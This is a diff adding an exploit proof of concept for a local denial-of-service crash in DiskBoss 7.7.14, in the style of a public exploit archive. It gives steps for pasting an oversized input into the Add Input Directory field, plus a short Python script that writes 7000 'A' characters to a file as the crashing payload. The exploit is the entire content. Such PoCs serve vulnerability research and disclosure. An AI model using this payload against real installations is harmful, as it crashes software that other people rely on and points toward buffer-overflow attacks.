@@ -1,0 +1,28 @@
+# Exploit Title: DiskBoss 7.7.14 - Denial of Service (PoC) 
+# Date: 2020-04-01
+# Exploit Author: Paras Bhatia
+# Vendor Homepage: https://www.diskboss.com/ 
+# Software Link Download: https://github.com/x00x00x00x00/diskboss_7.7.14/raw/master/diskboss_setup_v7.7.14.exe
+# Vulnerable Software: DiskBoss
+# Version: 7.7.14
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on: Windows 7 Ultimate Service Pack 1 (32 bit - English)  
+
+#Steps to Produce the Crash:
+
+#   1.- Run python code: DiskbossCrash.py
+#   2.- Copy content to clipboard
+#   3.- Open "diskboss.exe" (diskbsg.exe)
+#   4.- Go to "Command" > Search Files
+#   5.- Click on second + icon (located at right side of "Search Disks, Directories and Network Shares")
+#   6.- Click on " Add Input Directory"
+#   7.- Paste ClipBoard into the "Directory" field
+#   8.- Click on OK
+#   9.- Crashed
+
+#Python "DiskbossCrash.py" Code:
+   
+buffer = "\x41" * 7000
+f = open ("DiskbossCrash.txt", "w")
+f.write(buffer)
+f.close()
